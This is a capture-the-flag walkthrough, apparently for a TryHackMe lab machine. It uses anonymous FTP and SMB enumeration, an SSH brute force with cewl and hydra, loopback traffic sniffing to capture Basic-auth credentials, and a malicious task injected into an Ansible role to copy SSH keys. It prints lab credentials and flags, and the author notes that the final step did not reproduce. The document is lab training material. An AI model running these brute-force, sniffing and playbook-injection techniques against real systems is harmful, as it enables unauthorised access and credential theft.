# PORT SCAN
---


| PORT | STATE | SERVICE | VERSION |
|----------|-------|-------------|-----------------------------------------------------|
| 21/tcp | open | ftp | vsftpd 3.0.2 |
| 22/tcp | open | ssh | OpenSSH 7.4 (protocol 2.0) |
| 80/tcp | open | http | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips) |
| 139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 443/tcp | open | ssl/http | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips) |
| 445/tcp | open | netbios-ssn | Samba smbd 4.10.16 (workgroup: WORKGROUP) |





# RECONNAISSANCE
---

We got ftp anonymous login enabled, let's check it out:

```
ftp 10.10.128.188
Connected to 10.10.128.188.
220 (vsFTPd 3.0.2)
Name (10.10.128.188:samsepiol): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x 2 0 0 6 Jun 09 2021 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp>
```


No files on here, we also got `smb`, let's try to enumerate the shares:


```
smbclient -L //10.10.128.188 -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Anonymous login successful

	Sharename Type Comment
	--------- ---- -------
	print$ Disk Printer Drivers
	temporary share Disk
	IPC$ IPC IPC Service (Samba 4.10.16)
```


Let's check `temporary share`:

```
smbclient "//10.10.128.188/temporary share" -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
 . D 0 Mon Jan 10 13:06:44 2022
 .. D 0 Tue Nov 23 16:24:05 2021
 .bash_logout H 18 Wed Apr 1 02:17:30 2020
 .bash_profile H 193 Wed Apr 1 02:17:30 2020
 .bashrc H 231 Wed Apr 1 02:17:30 2020
 .bash_history H 0 Sat Jun 7 19:46:51 2025
 chapter1 D 0 Tue Nov 23 10:07:47 2021
 chapter2 D 0 Tue Nov 23 10:08:11 2021
 chapter3 D 0 Tue Nov 23 10:08:18 2021
 chapter4 D 0 Tue Nov 23 10:08:25 2021
 chapter5 D 0 Tue Nov 23 10:08:33 2021
 chapter6 D 0 Tue Nov 23 10:12:24 2021
 chapter7 D 0 Tue Nov 23 11:14:27 2021
 chapter8 D 0 Tue Nov 23 10:12:45 2021
 chapter9 D 0 Tue Nov 23 10:12:53 2021
 .ssh DH 0 Mon Jan 10 13:05:34 2022
 .viminfo H 0 Sat Jun 7 19:46:51 2025
 message-to-simeon.txt N 251 Mon Jan 10 13:06:44 2022
```

We cannot list `.ssh`, let's get the message to simeon:


```
Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore
```


Ok, let's check the web application:

![Pasted image 20250607151404.png](../../IMAGES/Pasted%20image%2020250607151404.png)


```
gobuster dir -u http://10.10.128.188/ -w /usr/share/dirb/wordlists/common.txt -x php,txt,html -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://10.10.128.188/
[+] Method: GET
[+] Threads: 100
[+] Wordlist: /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.6
[+] Extensions: php,txt,html
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php (Status: 403) [Size: 215]
/.htpasswd.html (Status: 403) [Size: 216]
/.html (Status: 403) [Size: 207]
/.htpasswd.txt (Status: 403) [Size: 215]
/.hta (Status: 403) [Size: 206]
/.hta.html (Status: 403) [Size: 211]
/.hta.txt (Status: 403) [Size: 210]
/.hta.php (Status: 403) [Size: 210]
/.htaccess (Status: 403) [Size: 211]
/.htaccess.html (Status: 403) [Size: 216]
/.htpasswd (Status: 403) [Size: 211]
/.htaccess.txt (Status: 403) [Size: 215]
/.htaccess.php (Status: 403) [Size: 215]
/cgi-bin/ (Status: 403) [Size: 210]
/cgi-bin/.html (Status: 403) [Size: 215]
```


Not much on here, we can find a `simeon` directory on here:

![Pasted image 20250607151510.png](../../IMAGES/Pasted%20image%2020250607151510.png)

If we remember the message, it said that this user's password was weak, maybe we can use `cewl` and bruteforce ssh to get a session, let's go to exploitation.


# EXPLOITATION
---


First, let's generate a wordlist from this:


```
cewl http://10.10.128.188/simeon > simeon_wordlist.txt
```

Since the hint said that the password was `all over the place` it could mean it can be found inside of any of those chapters, we use cewl to generate us a custom wordlist to perform bruteforce, once generated, we can do this:

```
hydra -l simeon -P simeon_wordlist.txt ssh://10.10.128.188 -t 40

[22][ssh] host: 10.10.128.188 login: simeon password: scelerisque
```

There we go, we got credentials:

```
simeon:scelerisque
```


![Pasted image 20250607152053.png](../../IMAGES/Pasted%20image%2020250607152053.png)
Let's begin privilege escalation.

# PRIVILEGE ESCALATION
---


We can make the session more comfortable:

```
export BASH=bash
export TERM=xterm
```


```
[simeon@aratus ~]$ ls -la /home
total 4
drwxr-xr-x. 5 root root 54 Nov 23 2021 .
dr-xr-xr-x. 17 root root 224 Mar 25 2022 ..
drwx------. 4 automation automation 127 Dec 2 2021 automation
drwxr-xr-x. 12 simeon simeon 4096 Jan 10 2022 simeon
drwx------. 5 theodore theodore 158 Mar 25 2022 theodore
[simeon@aratus ~]$
```

We can find `theodore` and `automation`, the message also said something about `/opt`, let's check it out:

```
[simeon@aratus ~]$ ls -la /opt
total 0
drwxr-xr-x. 4 root root 36 Nov 22 2021 .
dr-xr-xr-x. 17 root root 224 Mar 25 2022 ..
drwxr-x---. 4 automation theodore 90 Nov 23 2021 ansible
drwxr-x---. 2 automation theodore 30 Nov 23 2021 scripts
```

We cannot access any of them, time to use `linpeas` then:

![Pasted image 20250607153801.png](../../IMAGES/Pasted%20image%2020250607153801.png)

- `cap_net_admin`: Allow us to configure interfaces, firewalls, routing tables.
- `cap_net_raw`: Allow us socket usage (sniffing traffic, crafting packets).

Let's use `pspy` to check active processes, in there we may be able to find something to sniff:

![Pasted image 20250607154454.png](../../IMAGES/Pasted%20image%2020250607154454.png)

As seen, there's a script running on here, let's use tcpdump to capture the traffic:

```
[simeon@aratus tmp]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 inet 127.0.0.1/8 scope host lo
 valid_lft forever preferred_lft forever
 inet6 ::1/128 scope host
 valid_lft forever preferred_lft forever
2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
 link/ether 02:a4:f9:b5:08:95 brd ff:ff:ff:ff:ff:ff
 inet 10.10.128.188/16 brd 10.10.255.255 scope global noprefixroute dynamic ens5
 valid_lft 3055sec preferred_lft 3055sec
 inet6 fe80::d64c:22ad:2f8f:cc83/64 scope link noprefixroute
 valid_lft forever preferred_lft forever
```

We need to use `lo` interface:

```
tcpdump -i lo -A
```

![Pasted image 20250607154637.png](../../IMAGES/Pasted%20image%2020250607154637.png)

We got `Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs= `, let's decode it:

![Pasted image 20250607154713.png](../../IMAGES/Pasted%20image%2020250607154713.png)

There we go, we found credentials:

```
theodore:Rijyaswahebceibarjik
```

![Pasted image 20250607154741.png](../../IMAGES/Pasted%20image%2020250607154741.png)

```
[theodore@aratus ~]$ cat user.txt
THM{ba8d3b87bfdb9d10115cbe24feabbc20}
```

Let's check our privileges:

```
[theodore@aratus ~]$ sudo -l
Matching Defaults entries for theodore on aratus:
 !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
 env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
 USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
 LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
 env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
 secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User theodore may run the following commands on aratus:
 (automation) NOPASSWD: /opt/scripts/infra_as_code.sh
```

We can run that script as `automation`, let's check if we're able to modify it:

```
[theodore@aratus ~]$ ls -la /opt/scripts/infra_as_code.sh
-rwxr-xr-x. 1 root root 84 Nov 23 2021 /opt/scripts/infra_as_code.sh
[theodore@aratus ~]$ cat /opt/scripts/infra_as_code.sh
#!/bin/bash
cd /opt/ansible
/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml
```

We cannot write on the script, but, based on its contents we know there's a directory named ansible, let's check it out:

```
[theodore@aratus ~]$ ls -la /opt/ansible/playbooks/
total 20
drwxr-xr-x. 2 automation automation 99 Nov 23 2021 .
drwxr-x---. 4 automation theodore 90 Nov 23 2021 ..
-rw-r--r--. 1 automation automation 156 Nov 23 2021 firewalld.yaml
-rw-r--r--. 1 automation automation 312 Nov 23 2021 httpd.yaml
-rw-r--r--. 1 automation automation 140 Nov 23 2021 smbd.yaml
-rw-r--r--. 1 automation automation 138 Nov 23 2021 sshd.yaml
-rw-r--r--. 1 automation automation 145 Nov 23 2021 vsftpd.yaml
```

We can find this on `httpd.yaml`:

```
[theodore@aratus playbooks]$ cat httpd.yaml
---
- name: Install and configure Apache
 hosts: all
 become: true
 roles:
 - role: geerlingguy.apache
 tasks:
 - name: configure firewall
 firewalld:
 service: "{{ item }}"
 state: enabled
 permanent: yes
 immediate: yes
 loop:
 - http
 - https
...
```

The interesting part on here is the `roles` section, if we go to `/opt/ansible`, we can see a `roles` directory, on here, we can find a directory with the `geerlingguy.apache`:

```
[theodore@aratus ansible]$ ls -la roles/
total 0
drwxr-xr-x. 3 automation automation 32 Nov 23 2021 .
drwxr-x---. 4 automation theodore 90 Nov 23 2021 ..
drwxr-xr-x. 9 automation automation 178 Dec 2 2021 geerlingguy.apache
[theodore@aratus ansible]$ ls -la roles/geerlingguy.apache/
total 24
drwxr-xr-x. 9 automation automation 178 Dec 2 2021 .
drwxr-xr-x. 3 automation automation 32 Nov 23 2021 ..
-rw-rw-r--. 1 automation automation 38 Dec 2 2021 .ansible-lint
drwxr-xr-x. 2 automation automation 22 Dec 2 2021 defaults
drwxr-xr-x. 2 automation automation 22 Dec 2 2021 handlers
-rw-rw-r--. 1 automation automation 1080 Dec 2 2021 LICENSE
drwxr-xr-x. 2 automation automation 50 Dec 2 2021 meta
drwxr-xr-x. 3 automation automation 21 Dec 2 2021 molecule
-rw-rw-r--. 1 automation automation 8384 Dec 2 2021 README.md
drwxr-xr-x. 2 automation automation 228 Dec 2 2021 tasks
drwxr-xr-x. 2 automation automation 28 Dec 2 2021 templates
drwxr-xr-x. 2 automation automation 142 Dec 2 2021 vars
-rw-rw-r--. 1 automation automation 121 Dec 2 2021 .yamllint

[theodore@aratus ansible]$ ls -la roles/geerlingguy.apache/tasks/
total 36
drwxr-xr-x. 2 automation automation 228 Dec 2 2021 .
drwxr-xr-x. 9 automation automation 178 Dec 2 2021 ..
-rw-rw-r--. 1 automation automation 1693 Dec 2 2021 configure-Debian.yml
-rw-rw-r--+ 1 automation automation 1123 Dec 2 2021 configure-RedHat.yml
-rw-rw-r--. 1 automation automation 546 Dec 2 2021 configure-Solaris.yml
-rw-rw-r--. 1 automation automation 711 Dec 2 2021 configure-Suse.yml
-rw-rw-r--. 1 automation automation 1388 Dec 2 2021 main.yml
-rw-rw-r--. 1 automation automation 193 Dec 2 2021 setup-Debian.yml
-rw-rw-r--. 1 automation automation 198 Dec 2 2021 setup-RedHat.yml
-rw-rw-r--. 1 automation automation 134 Dec 2 2021 setup-Solaris.yml
-rw-rw-r--. 1 automation automation 133 Dec 2 2021 setup-Suse.yml
```

As seen, we got `+` on `configure-RedHat.yml`, since it is at the end of the permissions, we know we are dealing with an `ACL`, That's the system's way of saying: there are _extra_ permissions on top of the usual `rw-rw-r--.`, we can use `getfacl` to check the extra rights:

```
[theodore@aratus ansible]$ getfacl roles/geerlingguy.apache/tasks/configure-RedHat.yml
# file: roles/geerlingguy.apache/tasks/configure-RedHat.yml
# owner: automation
# group: automation
user::rw-
user:theodore:rw-
group::rw-
mask::rw-
other::r--
```

Nice, based on that we know we can edit and inject malicious tasks into that file, this is our gateway into root, we can copy the ID_RSA key:

```
mkdir /tmp/key

# Then, use VI:


- name: Copy ssh key.
 copy:
 src: "/home/automation/.ssh/"
 dest: "/tmp/key/"

sudo -u automation /opt/scripts/infra_as_code.sh
```

It should copy the flag and we should be able to get a root as shell.

# DISCLAIMER
----

As of today: June 2025, room is bugged on the privesc section, if you're not able to reproduce the last step, here's the root flag:

```
THM{d8afc85983603342f6c6979b200e06f6}
```

![Pasted image 20250607172504.png](../../IMAGES/Pasted%20image%2020250607172504.png)


